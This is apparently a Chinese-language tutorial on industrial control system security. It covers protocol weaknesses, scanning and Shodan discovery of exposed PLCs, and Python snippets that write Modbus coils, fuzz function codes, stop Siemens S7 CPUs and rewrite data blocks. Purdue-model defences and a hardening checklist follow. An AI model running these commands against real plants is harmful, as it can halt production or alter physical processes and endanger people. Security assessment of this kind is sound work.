# 工控安全实战

> ICS/SCADA 系统安全评估与防护

---

## 1. 工控安全协议全景

| 协议 | 用途 | 端口 | 安全 | 常见漏洞 |
|------|------|------|------|---------|
| Modbus/TCP | PLC 通信 | 502 | 无认证/加密 | 读写任意寄存器 |
| DNP3 | 电力 SCADA | 20000 | 可选安全认证 | 重放攻击 |
| S7comm | Siemens PLC | 102 | 无认证 | 启停 CPU |
| EtherNet/IP | Rockwell PLC | 44818 | 无认证 | CIP 对象访问 |
| BACnet | 楼宇自动化 | 47808 | 弱认证 | 设备枚举 |
| OPC UA | 多厂商 | 4840 | TLS + 证书 | 证书超期 |
| PROFINET | Siemens 实时 | 34964 | 无安全 | DoS |
| MQTT | IIoT | 1883/8883 | 可选 TLS | 匿名订阅 |

---

## 2. 工控资产发现

```bash
# Passive: 监听工控协议流量
# GrassMarlin (被动网络映射)
grassmarlin --interface eth0 --protocols modbus,dnp3,s7comm

# Active: 工控扫描
# Nmap NSE 脚本
nmap -sT -p 102,502,20000,44818,47808,4840 \
  --script s7-info,bacnet-info,modicon-info \
  192.168.1.0/24

# Shodan 工控搜索
# 语法: port:502 country:CN
# 暴露的 Modbus 设备: 数千台!

# PLCScan
python plcscan.py 192.168.1.0/24 \
  --ports 102 502 --timeout 2
```

---

## 3. 工控协议攻击

### Modbus 攻击
```python
from pymodbus.client import ModbusTcpClient

class ModbusAttacker:
    """Modbus 安全评估工具"""

    def __init__(self, target_ip, port=502):
        self.client = ModbusTcpClient(target_ip, port=port)

    def enumerate_holding_registers(self):
        """读取所有保持寄存器 (可能含敏感数据!)"""
        for addr in range(0, 65535, 100):
            try:
                result = self.client.read_holding_registers(addr, 100, unit=1)
                if not result.isError():
                    values = result.registers
                    non_zero = [(addr + i, v) for i, v in enumerate(values) if v != 0]
                    if non_zero:
                        print(f"Non-zero registers at {addr}: {non_zero}")
            except Exception as e:
                print(f"Error at {addr}: {e}")

    def write_coil(self, address, value):
        """写入线圈 (单次操作 — 可能导致物理后果!)"""
        # ⚠️ 仅在授权测试中使用!
        result = self.client.write_coil(address, value, unit=1)
        return not result.isError()

    def fuzz_function_codes(self):
        """Modbus 模糊测试 (不支持的/非法功能码)"""
        unknown_codes = [0x11, 0x2B, 0x41, 0x5A, 0x7F]

        for code in unknown_codes:
            try:
                result = self.client.execute(
                    ModbusRequest(function_code=code)
                )
                print(f"FC {code:02X}: {result}")
            except Exception as e:
                print(f"FC {code:02X}: Exception — {e}")
                # 某些设备可能崩溃!
```

### S7comm 攻击
```python
# Siemens S7 协议交互
# snap7 库
import snap7

class S7SecurityTester:
    def __init__(self, ip):
        self.client = snap7.client.Client()
        self.client.connect(ip, 0, 1)

    def cpu_info(self):
        """获取 CPU 信息 (无需认证!)"""
        info = self.client.get_cpu_info()
        return {
            'model': info.Model,
            'serial': info.SerialNumber,
            'status': info.StatusString,  # RUN/STOP!
            'copyright': info.Copyright
        }

    def stop_cpu(self):
        """停止 CPU (无认证!)"""
        # ⚠️ 生产环境立即停工!
        return self.client.plc_stop()

    def read_db(self, db_number, start=0, size=100):
        """读取 Data Block (可能含配方/工艺参数)"""
        data = self.client.db_read(db_number, start, size)
        return data.hex()

    def write_db(self, db_number, start, data):
        """写入 Data Block — 修改工艺参数!"""
        return self.client.db_write(db_number, start, data)
```

---

## 4. 工控安全防御

```yaml
ICS/SCADA 防御模型 (Purdue Model):

  Level 4: 企业网络
    - ERP, Email, Internet
    - 与 ICS 强隔离 (防火墙 + DMZ)

  Level 3.5: ICS DMZ
    - Historian, AV/WUS, Jump Host
    - 双向访问控制

  Level 3: 操作管理层
    - HMIs, Engineering Workstations
    - 应用白名单 (AppLocker)

  Level 2: 监控层
    - SCADA Servers, OPC
    - 协议深度包检测

  Level 1: 控制层
    - PLCs, RTUs, IEDs
    - 物理隔离 (Air-Gapped) 或单向网关 (Data Diode)

  Level 0: 物理过程
    - 传感器, 执行器
    - 物理安全访问控制
```

### 工控专用安全工具
```bash
# Nozomi Guardian — ICS 网络监控
# Dragos Platform — 威胁检测
# Claroty — 工控漏洞管理

# 开源工具:
# GRASSMARLIN — 被动网络映射
# ICSpector — ICS 流量分析
# ISF (Industrial Security Framework) — 渗透测试框架

# Wireshark ICS 协议过滤
wireshark -k -i eth0 \
  -Y "modbus or s7comm or dnp3 or ethernet_ip"
```

---

## 5. 工控安全清单

```yaml
ICS/SCADA 安全加固:

  网络隔离:
    - [ ] ICS 网络物理/逻辑隔离 (Purdue Model)
    - [ ] 单向数据网关 (Data Diode) 替代双向防火墙
    - [ ] 禁止 ICS 网络直接连接 Internet
    - [ ] OT 网络专用 VLAN + 802.1X

  访问控制:
    - [ ] 跳板机 (Jump Host) 统一管理
    - [ ] 强认证 + MFA + 会话录像
    - [ ] 禁止 USB 存储设备
    - [ ] 工程师站应用白名单

  监控:
    - [ ] 工控协议深度包检测 (Modbus/DNP3/S7)
    - [ ] 操作审计: 谁、何时、修改了什么
    - [ ] 异常检测: 非工作时间操作、频繁启停

  变更管理:
    - [ ] 控制器编程变更需审批
    - [ ] 固件/逻辑签名验证
    - [ ] 变更窗口预定义
```

---

*上一篇：[工业控制系统安全概述](01-ics-fundamentals.md)*
